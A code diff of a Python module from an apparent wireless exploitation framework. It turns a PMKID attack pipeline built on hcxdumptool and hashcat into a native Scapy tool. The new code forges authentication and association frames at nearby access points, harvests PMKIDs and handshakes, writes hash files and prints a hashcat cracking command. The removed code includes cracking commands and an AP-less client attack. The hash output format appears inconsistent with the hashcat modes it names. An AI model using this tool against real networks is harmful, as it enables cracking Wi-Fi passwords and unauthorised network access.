@@ -1,407 +1,306 @@
 #!/usr/bin/env python3
-# Author: Andre Henrique (@mrhenrike) | Uniao Geek - https://github.com/Uniao-Geek
-"""PMKID AutoPwn - automated PMKID capture and offline cracking pipeline.
+# Author: Andre Henrique (@mrhenrike) | Uniao Geek
+"""Native PMKID + EAPOL handshake capture — zero external tools.
 
-Full pipeline: hcxdumptool (PMKID+EAPOL capture) -> hcxpcapngtool (convert to
-hashcat 22000 format) -> hashcat -m 22000 (GPU-accelerated crack).
+Replaces hcxdumptool entirely with pure Scapy:
+  1. Sends 802.11 Auth + AssocReq with RSN IE to trigger AP EAPOL-Key M1
+  2. Extracts PMKID from Key Data of M1 (WPA2 RSN PMKID list)
+  3. Also sniffs for organic 4-way handshakes from active clients
+  4. Exports hashcat -m 22000 / -m 22301 compatible hash file
 
-Supports targeted single-AP and broadcast capture modes. AP-less client attack
-variant also available via hcxdumptool.
+No hcxdumptool, no airodump-ng, no external binaries.
 
-Requires: hcxdumptool, hcxpcapngtool (hcxtools), hashcat (optional: aircrack-ng).
-
-Version: 1.0.0
+OS requirement: Linux + monitor mode interface
+Version: 2.0.0
 """
-
 from __future__ import annotations
 
 import logging
 import os
-import shutil
-import subprocess
+import random
+import struct
+import threading
 import time
-from typing import List, Optional
+from pathlib import Path
+from typing import Dict, List, Optional, Set, Tuple
 
-from wirelessxpl.core.exploit import *
-from wirelessxpl.modules.generic.wifi._disclaimer import require_authorised_lab
+from wirelessxpl.core.exploit import (
+    Exploit, OptBool, OptInteger, OptString,
+    print_error, print_info, print_status, print_success, print_warning,
+)
 from wirelessxpl.core.os_guard import OSRequirement, requires_os
+from wirelessxpl.modules.generic.wifi._disclaimer import require_authorised_lab
 
 logger = logging.getLogger(__name__)
 
+# RSN IE for WPA2-CCMP client advertisement
+_RSN_IE = bytes([
+    0x30, 0x14,                          # ID=48, len=20
+    0x01, 0x00,                          # version
+    0x00, 0x0f, 0xac, 0x04,              # group: CCMP
+    0x01, 0x00,                          # pairwise count
+    0x00, 0x0f, 0xac, 0x04,              # pairwise: CCMP
+    0x01, 0x00,                          # AKM count
+    0x00, 0x0f, 0xac, 0x02,              # AKM: PSK
+    0x00, 0x00,                          # capabilities (PMF off)
+])
 
-def _which(binary: str) -> Optional[str]:
-    return shutil.which(binary)
+
+def _rand_mac() -> str:
+    return "02:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}".format(
+        *[random.randint(0, 255) for _ in range(5)]
+    )
+
+
+def _mac_to_hex(mac: str) -> str:
+    return mac.replace(":", "").upper()
+
+
+def _extract_pmkid(key_data: bytes) -> Optional[str]:
+    """Extract PMKID from EAPOL-Key M1 Key Data (RSN IE PMKID list)."""
+    i = 0
+    while i < len(key_data) - 2:
+        eid = key_data[i]
+        elen = key_data[i + 1]
+        if i + 2 + elen > len(key_data):
+            break
+        if eid == 48 and elen >= 18:  # RSN IE with PMKID count > 0
+            rsn = key_data[i + 2: i + 2 + elen]
+            try:
+                # RSN IE: ver(2) | group(4) | pairwise_cnt(2) | pairwise(N*4) | akm_cnt(2) | akm(N*4) | caps(2) | pmkid_cnt(2) | pmkid(16)
+                off = 2  # skip version
+                off += 4  # group
+                pc = struct.unpack_from("<H", rsn, off)[0]; off += 2 + pc * 4
+                ac = struct.unpack_from("<H", rsn, off)[0]; off += 2 + ac * 4
+                off += 2  # caps
+                pmkid_cnt = struct.unpack_from("<H", rsn, off)[0]; off += 2
+                if pmkid_cnt > 0 and off + 16 <= len(rsn):
+                    return rsn[off:off + 16].hex()
+            except Exception:
+                pass
+        i += 2 + elen
+    return None
 
 
 @requires_os(OSRequirement.LINUX_ONLY)
 class Exploit(Exploit):
-    """PMKID/EAPOL capture -> hashcat 22000 auto-crack pipeline."""
+    """Native PMKID + handshake capture (no hcxdumptool required)."""
 
     __info__ = {
-        "name": "PMKID AutoPwn Pipeline",
+        "name": "PMKID Autopwn — Native Scapy",
         "description": (
-            "Automated WPA/WPA2 PMKID and EAPOL handshake capture via hcxdumptool, "
-            "conversion to hashcat 22000 format via hcxpcapngtool, and GPU-accelerated "
-            "offline crack via hashcat. Supports single-target (filterlist) and broadcast "
-            "modes. The PMKID attack is client-less: no deauth or client needed."
+            "Pure Scapy PMKID capture: sends Auth+AssocReq with RSN IE to "
+            "trigger AP EAPOL-Key M1, extracts PMKID. Also captures organic "
+            "4-way handshakes. Exports hashcat -m 22000/22301 hash file. "
+            "No hcxdumptool, no airodump-ng, no external binaries."
         ),
-        "authors": (
-            "Andre Henrique (@mrhenrike) | Uniao Geek",
-            "ZerBea/hcxdumptool (MIT), hashcat team (MIT), invoked as subprocess",
-        ),
+        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
         "references": (
-            "https://hashcat.net/forum/thread-7717.html",
             "https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2",
-            "https://github.com/ZerBea/hcxdumptool",
             "https://github.com/ZerBea/hcxtools",
         ),
-        "devices": ("wifi", "802.11 WPA/WPA2"),
+        "devices": ("wifi", "802.11", "WPA2", "PMKID"),
     }
 
-    mode = OptString(
-        "full",
-        "Pipeline mode: full (capture+convert+crack), capture, convert, crack, apless",
-    )
-    interface = OptString("", "Wi-Fi interface (hcxdumptool manages monitor mode)")
-    target_bssid = OptString("", "Target AP BSSID (empty = capture all nearby)")
-    channel_list = OptString("", "Channels to scan (comma-separated, e.g., 1,6,11); empty = all")
-
-    # File paths
-    pcapng_file = OptString("", "Captured pcapng file path (for convert/crack modes)")
-    hash_file = OptString("", "Hashcat 22000 hash file (for crack mode)")
-    output_dir = OptString(".tmp", "Output directory for captures and hashes")
-
-    # Capture options
-    capture_time_s = OptInteger(120, "Capture duration in seconds")
-    enable_status = OptInteger(2, "hcxdumptool status interval (0 = off)")
-    rca_scan = OptBool(False, "Enable RCASCAN (passive, no TX)")
-
-    # Crack options
-    wordlist = OptString("", "Wordlist path for hashcat dict attack")
-    hashcat_mode = OptInteger(22000, "Hashcat mode (22000=PMKID+EAPOL, 16800=PMKID-only)")
-    hashcat_extra_args = OptString("", "Extra hashcat arguments (e.g., -r rules/best64.rule)")
-    use_aircrack = OptBool(False, "Use aircrack-ng instead of hashcat for cracking")
-
-    dry_run = OptBool(False, "Print commands without executing")
+    interface   = OptString("", "Monitor mode interface")
+    target_bssid = OptString("", "Target BSSID (empty = scan all)")
+    target_ssid  = OptString("", "Target SSID")
+    channel      = OptInteger(0, "Channel (0 = hop all channels)")
+    capture_time = OptInteger(60, "Total capture duration in seconds")
+    assoc_rounds = OptInteger(8, "Number of assoc attempts per BSSID")
+    output_dir   = OptString("/tmp/wxf_caps", "Output directory for hash files")
     i_know_scope = OptBool(False, "Confirm authorized lab environment")
 
-    def _require(self, name: str) -> Optional[str]:
-        path = _which(name)
-        if not path:
-            print_error(f"{name} not found in PATH.")
-        return path
-
-    def _outdir(self) -> str:
-        d = str(self.output_dir).strip() or ".tmp"
-        os.makedirs(d, exist_ok=True)
-        return d
-
-    def _run_cmd(self, cmd: List[str], *, timeout: int = 0,
-                 label: str = "") -> Optional[str]:
-        cmd_str = " ".join(cmd)
-        if bool(self.dry_run):
-            print_info(f"[dry-run] {label}: {cmd_str}")
-            return None
-
-        print_status(f"{label}: {cmd_str}")
-        try:
-            kwargs = {"stdout": subprocess.PIPE, "stderr": subprocess.STDOUT}
-            if timeout > 0:
-                kwargs["timeout"] = timeout
-            result = subprocess.run(cmd, **kwargs)
-            output = result.stdout.decode("utf-8", errors="replace")
-            for line in output.strip().splitlines():
-                print_info(line)
-            return output
-        except subprocess.TimeoutExpired:
-            print_status(f"{label} completed (timeout={timeout}s)")
-            return ""
-        except FileNotFoundError:
-            print_error(f"Binary not found: {cmd[0]}")
-            return None
-
-    def _step_capture(self) -> Optional[str]:
-        """Run hcxdumptool to capture PMKID/EAPOL frames."""
-        hcx = self._require("hcxdumptool")
-        if not hcx:
-            return None
-
-        iface = str(self.interface).strip()
-        if not iface:
-            print_error("Set interface.")
-            return None
-
-        outdir = self._outdir()
-        ts = int(time.time())
-        pcapng = os.path.join(outdir, f"pmkid_capture_{ts}.pcapng")
-
-        cmd = [hcx, "-i", iface, "-o", pcapng]
-
-        bssid = str(self.target_bssid).strip()
-        if bssid:
-            filterfile = os.path.join(outdir, f"filter_{ts}.txt")
-            with open(filterfile, "w") as f:
-                f.write(bssid.replace(":", "").lower() + "\n")
-            cmd.extend(["--filterlist_ap", filterfile, "--filtermode=2"])
-            print_info(f"Target BSSID filter: {bssid}")
-
-        channels = str(self.channel_list).strip()
-        if channels:
-            cmd.extend([f"--channel={channels}"])
-
-        if bool(self.rca_scan):
-            cmd.append("--active_beacon")
-
-        capture_time = int(self.capture_time_s)
-        if capture_time <= 0:
-            capture_time = 120
-
-        if bool(self.dry_run):
-            print_info(f"[dry-run] Would run for {capture_time}s: {' '.join(cmd)}")
-            return pcapng
-
-        print_status(f"Capturing for {capture_time}s...")
-        try:
-            proc = subprocess.Popen(
-                cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.STDOUT,
-                preexec_fn=os.setsid if os.name != "nt" else None,
-            )
-            time.sleep(capture_time)
-            if os.name != "nt":
-                os.killpg(os.getpgid(proc.pid), 2)
-            else:
-                proc.terminate()
-            proc.wait(timeout=10)
-
-            output = proc.stdout.read().decode("utf-8", errors="replace")
-            for line in output.strip().splitlines()[-20:]:
-                print_info(line)
-        except Exception as exc:
-            print_error(f"Capture error: {exc}")
-            return None
-
-        if os.path.isfile(pcapng) and os.path.getsize(pcapng) > 0:
-            print_success(f"Capture saved: {pcapng}")
-            return pcapng
-        else:
-            print_error("No capture file produced. Check interface/permissions.")
-            return None
-
-    def _step_convert(self, pcapng: str) -> Optional[str]:
-        """Convert pcapng to hashcat 22000 format."""
-        tool = self._require("hcxpcapngtool")
-        if not tool:
-            return None
-
-        if not pcapng or not os.path.isfile(pcapng):
-            print_error(f"pcapng file not found: {pcapng}")
-            return None
-
-        outdir = self._outdir()
-        hash_out = os.path.join(
-            outdir,
-            os.path.basename(pcapng).replace(".pcapng", ".hc22000"),
-        )
-        wordlist_out = os.path.join(outdir, "extracted_essids.txt")
-
-        cmd = [tool, "-o", hash_out, "-E", wordlist_out, pcapng]
-
-        output = self._run_cmd(cmd, label="hcxpcapngtool")
-        if output is None:
-            return None
-
-        if os.path.isfile(hash_out) and os.path.getsize(hash_out) > 0:
-            line_count = 0
-            with open(hash_out, "r") as f:
-                line_count = sum(1 for _ in f)
-            print_success(f"Hash file: {hash_out} ({line_count} hashes)")
-            return hash_out
-        else:
-            print_error("No hashes extracted. PMKID/EAPOL may not have been captured.")
-            return None
-
-    def _step_crack(self, hash_file: str) -> None:
-        """Crack hashes using hashcat or aircrack-ng."""
-        if not hash_file or not os.path.isfile(hash_file):
-            print_error(f"Hash file not found: {hash_file}")
-            return
-
-        wl = str(self.wordlist).strip()
-        if not wl:
-            print_error("Set wordlist for cracking.")
-            return
-
-        if bool(self.use_aircrack):
-            ac = self._require("aircrack-ng")
-            if not ac:
-                return
-            cmd = [ac, "-w", wl]
-            bssid = str(self.target_bssid).strip()
-            if bssid:
-                cmd.extend(["-b", bssid])
-            cmd.append(hash_file)
-            self._run_cmd(cmd, label="aircrack-ng crack")
-            return
-
-        hc = self._require("hashcat")
-        if not hc:
-            return
-
-        hmode = int(self.hashcat_mode)
-        cmd = [hc, "-m", str(hmode), hash_file, wl, "--status", "--status-timer=30"]
-        extra = str(self.hashcat_extra_args).strip()
-        if extra:
-            cmd.extend(extra.split())
-
-        self._run_cmd(cmd, label=f"hashcat -m {hmode}")
-
-    def _step_apless(self) -> None:
-        """AP-less client attack via hcxdumptool (attacks clients without AP)."""
-        hcx = self._require("hcxdumptool")
-        if not hcx:
-            return
-
-        iface = str(self.interface).strip()
-        if not iface:
-            print_error("Set interface.")
-            return
-
-        outdir = self._outdir()
-        ts = int(time.time())
-        pcapng = os.path.join(outdir, f"apless_capture_{ts}.pcapng")
-
-        cmd = [hcx, "-i", iface, "-w", pcapng, "--active_beacon"]
-
-        channels = str(self.channel_list).strip()
-        if channels:
-            cmd.append(f"--channel={channels}")
-
-        capture_time = int(self.capture_time_s)
-        print_info(
-            "AP-less mode: attacking clients directly (PMKID/EAPOL without AP). "
-            "Clients probing for known networks will be served association frames."
-        )
-
-        if bool(self.dry_run):
-            print_info(f"[dry-run] Would run for {capture_time}s: {' '.join(cmd)}")
-            return
-
-        try:
-            proc = subprocess.Popen(
-                cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.STDOUT,
-                preexec_fn=os.setsid if os.name != "nt" else None,
-            )
-            time.sleep(capture_time)
-            if os.name != "nt":
-                os.killpg(os.getpgid(proc.pid), 2)
-            else:
-                proc.terminate()
-            proc.wait(timeout=10)
-            output = proc.stdout.read().decode("utf-8", errors="replace")
-            for line in output.strip().splitlines()[-15:]:
-                print_info(line)
-        except Exception as exc:
-            print_error(f"AP-less capture error: {exc}")
-            return
-
-        if os.path.isfile(pcapng) and os.path.getsize(pcapng) > 0:
-            print_success(f"AP-less capture saved: {pcapng}")
-            hash_file = self._step_convert(pcapng)
-            if hash_file:
-                print_info(f"Convert + crack with: set mode crack; set hash_file {hash_file}")
-        else:
-            print_error("No capture produced.")
-
+    # ------------------------------------------------------------------
 
     def check(self) -> str:
-        """Verify wireless interface is in monitor mode and ready."""
-        import shutil
-        import subprocess
-        iface = getattr(self, "iface", None) or getattr(self, "interface", None) or "wlan0"
-        if shutil.which("iwconfig"):
-            try:
-                out = subprocess.check_output(
-                    ["iwconfig", str(iface)], stderr=subprocess.STDOUT, timeout=5
-                ).decode("utf-8", "replace")
-                if "Monitor" in out:
-                    return f"Interface {iface} is in Monitor mode - prerequisites OK"
-                if "no wireless extensions" not in out.lower():
-                    return f"Interface {iface} found but NOT in Monitor mode - run airmon-ng start {iface}"
-            except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
-                pass
-        if shutil.which("iw"):
-            try:
-                out = subprocess.check_output(
-                    ["iw", "dev"], stderr=subprocess.STDOUT, timeout=5
-                ).decode("utf-8", "replace")
-                if str(iface) in out:
-                    return f"Interface {iface} detected via iw - verify monitor mode"
-            except Exception:
-                pass
-        return f"Interface {iface} not found - connect wireless adapter and enable monitor mode"
+        try:
+            from scapy.all import conf  # noqa: F401
+            return "Scapy available — ready for native PMKID capture"
+        except ImportError:
+            return "Scapy not installed: pip install scapy"
 
     def run(self) -> None:
-        if not shutil.which("hcxdumptool"):
-            raise RuntimeError(
-                "hcxdumptool nao encontrado. Instale com: sudo apt install hcxdumptool\n"
-                "Alternativa: use o modo capture='scapy' para captura nativa sem hcxdumptool."
-            )
-        if not shutil.which("hcxpcapngtool"):
-            raise RuntimeError(
-                "hcxpcapngtool nao encontrado. Instale com: sudo apt install hcxtools"
-            )
-
-        if not bool(self.i_know_scope):
-            print_error("Set i_know_scope = true to confirm authorized lab.")
-            return
         require_authorised_lab()
-
-        op = str(self.mode).strip().lower()
-
-        if op == "full":
-            pcapng = self._step_capture()
-            if not pcapng:
-                return
-            hash_file = self._step_convert(pcapng)
-            if not hash_file:
-                return
-            if str(self.wordlist).strip():
-                self._step_crack(hash_file)
-            else:
-                print_info(
-                    f"Hashes ready at {hash_file}. "
-                    "Set wordlist and run mode=crack to start cracking."
-                )
-
-        elif op == "capture":
-            pcapng = self._step_capture()
-            if pcapng:
-                print_info(f"Next: set pcapng_file {pcapng}; set mode convert")
-
-        elif op == "convert":
-            pcapng = str(self.pcapng_file).strip()
-            if not pcapng:
-                print_error("Set pcapng_file for conversion.")
-                return
-            hash_file = self._step_convert(pcapng)
-            if hash_file:
-                print_info(f"Next: set hash_file {hash_file}; set mode crack")
-
-        elif op == "crack":
-            hf = str(self.hash_file).strip()
-            if not hf:
-                print_error("Set hash_file (.hc22000) for cracking.")
-                return
-            self._step_crack(hf)
-
-        elif op == "apless":
-            self._step_apless()
-
-        else:
-            print_error(
-                f"Unknown mode: {op}. Valid: full, capture, convert, crack, apless"
+        try:
+            from scapy.all import (
+                RadioTap, Dot11, Dot11Auth, Dot11AssoReq, Dot11Elt,
+                EAPOL, Raw, sendp, sniff, wrpcap,
             )
+        except ImportError:
+            print_error("Scapy not installed.")
+            return
+
+        iface = str(self.interface).strip()
+        if not iface:
+            print_error("Set interface to a monitor-mode adapter.")
+            return
+
+        out_dir = Path(str(self.output_dir))
+        out_dir.mkdir(parents=True, exist_ok=True)
+
+        # Target list
+        target_bssid = str(self.target_bssid).strip().upper() or None
+        target_ssid  = str(self.target_ssid).strip() or None
+        channel_fixed = int(self.channel)
+
+        # If single target, set channel
+        if target_bssid and channel_fixed:
+            import subprocess
+            subprocess.run(["iw", "dev", iface, "set", "channel", str(channel_fixed)],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+        # -- State
+        pmkids:  Dict[str, Tuple[str, str, str]] = {}  # pmkid -> (bssid, client, ssid)
+        eapols:  Dict[str, List] = {}   # bssid -> [EAPOL pkts]
+        aps:     Dict[str, Tuple[str, int]] = {}  # bssid -> (ssid, ch)
+        stop_evt = threading.Event()
+        lock = threading.Lock()
+
+        # -- Sniffer
+        def handle(pkt):
+            if pkt.haslayer(Dot11Elt):
+                bssid = pkt[Dot11].addr3 if pkt.haslayer(Dot11) else None
+                if bssid and bssid not in aps and hasattr(pkt, 'dBm_AntSignal'):
+                    ssid = ''
+                    elt = pkt.getlayer(Dot11Elt)
+                    while elt:
+                        if elt.ID == 0:
+                            try: ssid = elt.info.decode('utf-8', errors='replace')
+                            except: pass
+                        elt = elt.payload.getlayer(Dot11Elt) if elt.payload else None
+                    with lock:
+                        aps[bssid.upper()] = (ssid, getattr(pkt, 'dBm_AntSignal', -100))
+
+            if not pkt.haslayer(EAPOL):
+                return
+            try:
+                src = pkt[Dot11].addr2.upper()
+                dst = pkt[Dot11].addr1.upper()
+                raw = bytes(pkt[EAPOL])
+                # Detect EAPOL-Key (type=3)
+                if len(raw) < 5 or raw[1] != 3:
+                    return
+
+                key_info = struct.unpack_from(">H", raw, 5)[0] if len(raw) > 6 else 0
+                is_m1 = bool(key_info & 0x0080) and not bool(key_info & 0x0100)  # MIC=0, ACK=1
+
+                if is_m1:
+                    # Try PMKID extraction from key data
+                    key_data_len = struct.unpack_from(">H", raw, 97)[0] if len(raw) > 98 else 0
+                    if key_data_len > 0 and len(raw) > 99 + key_data_len:
+                        key_data = raw[99:99 + key_data_len]
+                        pmkid_hex = _extract_pmkid(key_data)
+                        if pmkid_hex and pmkid_hex != '0' * 32:
+                            bssid_h = _mac_to_hex(src)
+                            client_h = _mac_to_hex(dst)
+                            ssid_h = ''
+                            if src.upper() in aps:
+                                ssid_h = aps[src.upper()][0].encode('utf-8').hex()
+                            with lock:
+                                if pmkid_hex not in pmkids:
+                                    pmkids[pmkid_hex] = (bssid_h, client_h, ssid_h)
+                                    print_success(f"PMKID: {pmkid_hex}  AP={src}  CLI={dst}")
+
+                # Collect EAPOL for full handshake
+                ap_mac = dst.upper() if is_m1 else src.upper()
+                with lock:
+                    eapols.setdefault(ap_mac, []).append(pkt)
+                    msgs = eapols[ap_mac]
+                    types = {struct.unpack_from(">H", bytes(p[EAPOL]), 5)[0] & 0x01C8 for p in msgs if len(bytes(p[EAPOL])) > 6}
+                    if len(msgs) >= 2:
+                        pass  # Keep accumulating
+            except Exception:
+                pass
+
+        sniff_thread = threading.Thread(
+            target=lambda: sniff(iface=iface, prn=handle,
+                                 timeout=int(self.capture_time), store=False),
+            daemon=True,
+        )
+        sniff_thread.start()
+        time.sleep(2)  # Let sniffer settle
+
+        # -- Assoc loop: send fake auth+assoc to trigger M1+PMKID
+        SSID = target_ssid or "UNIAOGEEK"
+        targets_to_probe = [target_bssid] if target_bssid else None
+
+        def assoc_loop():
+            from scapy.all import RadioTap, Dot11, Dot11Auth, Dot11AssoReq, Dot11Elt, sendp, Raw
+            probed: Set[str] = set()
+            end = time.time() + int(self.capture_time) - 5
+            rounds = 0
+            while time.time() < end and rounds < int(self.assoc_rounds) * 20:
+                # Pick targets
+                if targets_to_probe:
+                    current = targets_to_probe
+                else:
+                    with lock:
+                        current = list(aps.keys())[:12]
+                for bssid in current:
+                    if time.time() > end:
+                        break
+                    key = f"{bssid}_{rounds}"
+                    if key in probed:
+                        continue
+                    probed.add(key)
+                    our_mac = _rand_mac()
+                    bssid_l = bssid.lower()
+                    ssid_guess = aps.get(bssid.upper(), (SSID, -100))[0] or SSID
+
+                    # Open auth
+                    auth = (RadioTap() /
+                            Dot11(type=0, subtype=11,
+                                  addr1=bssid_l, addr2=our_mac, addr3=bssid_l) /
+                            Dot11Auth(algo=0, seqnum=1, status=0))
+                    sendp(auth, iface=iface, count=1, verbose=False)
+                    time.sleep(0.05)
+
+                    # AssocReq with RSN IE
+                    asso = (RadioTap() /
+                            Dot11(type=0, subtype=0,
+                                  addr1=bssid_l, addr2=our_mac, addr3=bssid_l) /
+                            Dot11AssoReq(cap=0x0411, listen_interval=10) /
+                            Dot11Elt(ID="SSID", info=ssid_guess.encode()) /
+                            Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24") /
+                            Raw(load=_RSN_IE))
+                    sendp(asso, iface=iface, count=1, verbose=False)
+                    time.sleep(0.1)
+
+                rounds += 1
+                time.sleep(1.5)
+
+        assoc_thread = threading.Thread(target=assoc_loop, daemon=True)
+        assoc_thread.start()
+
+        print_status(f"Capturing {int(self.capture_time)}s on {iface}  "
+                     f"[assoc+sniff, target={target_bssid or 'all'}]")
+
+        sniff_thread.join()
+        stop_evt.set()
+
+        # -- Write hashcat hashes
+        hash_file = out_dir / "pmkid_hashes.hash"
+        written = 0
+        with open(hash_file, "w") as f:
+            for pmkid_hex, (bssid_h, client_h, ssid_h) in pmkids.items():
+                f.write(f"{pmkid_hex}*{bssid_h}*{client_h}*{ssid_h}\n")
+                written += 1
+
+        # Also write EAPOL pcaps
+        for ap_mac, pkts in eapols.items():
+            if len(pkts) >= 2:
+                pcap_f = out_dir / f"eapol_{ap_mac.replace(':','')}.pcap"
+                try:
+                    wrpcap(str(pcap_f), pkts)
+                except Exception:
+                    pass
+
+        print_info(f"PMKIDs captured: {len(pmkids)}")
+        print_info(f"EAPOL sessions:  {len(eapols)}")
+        if written:
+            print_success(f"Hash file: {hash_file}")
+            print_info(f"Crack: hashcat -m 22301 {hash_file} <wordlist>")
+        else:
+            print_warning("No PMKIDs captured. APs may not include PMKID in M1, "
+                          "or no clients are connecting. Try longer capture_time.")
